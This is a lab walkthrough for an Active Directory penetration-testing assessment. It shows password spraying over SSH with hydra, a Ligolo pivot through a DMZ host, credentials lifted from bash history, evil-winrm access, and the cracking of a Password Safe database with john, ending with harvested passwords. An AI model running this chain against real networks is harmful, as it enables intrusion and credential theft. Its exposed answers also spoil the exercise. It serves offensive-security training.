## The Credential Theft Shuffle
[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`.

## Skills Assessment
`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |

#### Pivoting Primer
The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.


## Questions
What is the NTLM hash of NEXURA\Administrator?

## Solution
Full Name: Betty Jayde
Password: Texas123!@#

DMZ01: 10.129.234.116 (External) -> Linux Machine

1. Firstly let's scan the IP to list open port:
```shell
> nmap -sC -sV -Pn 10.129.234.116 -oA dmz01_scan

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
```

2. We can connect to the target machine with password given but we don't know the username yet. We can create a list of possible username with our custom tool and try every possibilities with hydra. We could also use username-anarchy tool.
```shell
> echo 'Betty Jayde' > users.txt
> ADUsersGen -l users.txt  > userlist.txt
> cat userlist.txt
bjayde
bettyjayde
jaydebetty
betty.jayde
jayde.betty
b.jayde
betty
jayde
jbetty

> hydra -L userlist.txt -p 'Texas123!@#' -f 10.129.234.116 ssh
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#

Username: jbetty
Password: Texas123!@#

> ssh jbetty@10.129.234.116
```

![[screenshot-2025-10-10_14-23-30.png]]

3. Set up Ligolo to make DMZ01 machine our pivot
```shell
DONT RUN LIGOLO ON EXEGOL

1. Import agent binary to compromised host DMZ01 with http server.
2. Create interface for ligolo :
> sudo ip tuntap add user vdarras mode tun ligolo

3. Enable the interface 
> sudo ip link set ligolo up

4. Run ligolo proxy on host machine
> ./proxy -selfcert 

5. Run Agent on target machine to establish connection:
Target > ./agent -connect 10.10.14.237:11601 -ignore-cert

6. We get connection back on host machine we can now use our session 1.
ligolo > session
ligolo > 1
ligolo > ifconfig (Agent interfaces)

7. Add rule to routing table, we have to add the target internal subnetwork to our routing table (Not on exegol)
> 
```
![[Pasted image 20251010175900.png]]
```shell
We can confirm that it has beem added with this command on the screenshot above.

8. Start the tunnel on Ligolo session.
ligolo > start
```

4. Tunnel is done, we can now interact with the internal network. Let's scan the 3 inernal hosts
```shell
> cat hosts.txt
172.16.119.7
172.16.119.10
172.16.119.11

> nmap -sC -sV -Pn -iL hosts.txt -oA internal
```

5. Try to find credentials
```shell
ssh > cat .bash_history
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01

On HOST FILE01 (172.16.119.10) : hwilliam:dealer-screwed-gym1

Thanks to the nmap scan we can see WinRM service is running:

> evil-winrm -u "hwilliam" -p 'dealer-screwed-gym1' -i "172.16.119.7"
*Evil-WinRM* PS C:\Users\hwilliam\Documents>
```

6. Find a .lnk file in hwilliam Desktop
```shell
*Evil-WinRM* PS C:\Users\hwilliam\Desktop> [Convert]::ToBase64String((Get-Content -path "C:/Users/hwilliam/Desktop/Password Safe 3.lnk" -Encoding byte))
TAAAAAEUAgAAAAAAwAAAAAAAAEabAAgAIAAAAACBBWfPl9sBnuzAMBm52wEAgQVnz5fbAWDTZwAAAAAAAQAAAAAAAAAAAAAAAAAAAAoCFAAfUOBP0CDqOmkQotgIACswMJ2kAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAiwAAACcA7759AAAAMVNQU7edrv+NHP9DgYyEQDqjcy1hAAAAZAAAAAAfAA<...SNIP...>

On the linux machine paste the base64, decode it and redirect it to a file.

> echo 'TAAAAAEUAgAAAAAAwAAAAAAAAEabAAgAIAAAAACBBWfPl9sBnuzAMBm52wEAgQVnz5fbAWDTZwAAAAAAAQAAAAAAAAAAAAAAAAAAAAoCFAAfUOBP0CDqOmkQotgIACswMJ2kAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAiwAAACcA7759AAAAMVNQU7edrv+NHP9DgYyEQDqjcy1hAAAAZAAAAAAfAAAAKAAAAE0AaQBjAHIAbwBzAG8AZgB0AC4AVwBpAG4AZABvAHcAcwAuAEMAbwByAHQAYQBuAGEAXwBjAHcANQBuADEAaAAyAHQAeAB5AGUAdwB5AAAAAAAAAAAAAAAZAIwAMQAAAAAAnVqdeREAUFJPR1JBfjEAAHQACQAEAO++L01hOp1anXkuAAAAQgAAAAAAAQAAAAAAAAAAAEoAAAAAAOP8AwB<SNIP>' | base64 -d > password.lnk

Lets see what we can find with small static analysis
> strings password.lnk
...
PROGRA~1
/Ma:
PASSWO~1
pwsafe.exe
C:\Program Files\Password Safe\pwsafe.exe
jump01
...

We can see that pwsafe is running to manage password locally in a .psafe3 database. 
```

7. We can connect in rdp and open Password Safe program. We need a .psafe3 database AND we also need a password to enter it.
```shell
We see that we have access to a share called HR and we find this file:
\\file01\HR\Archive\Employee-Passwords_OLD.psafe3
Get the file on host with rdp shared volume

On exegol:
> pwsafe2john.py Employee-Passwords_OLD.psafe3 > hash
> john hash --wordlist=rockyou.txt
michaeljackson   (Employee-Passwords_OLD)

Enter into the database via RDP and we can collect those passwords:

bdavid:caramel-cigars-reply1
stom:fails-nibble-disturb4 
```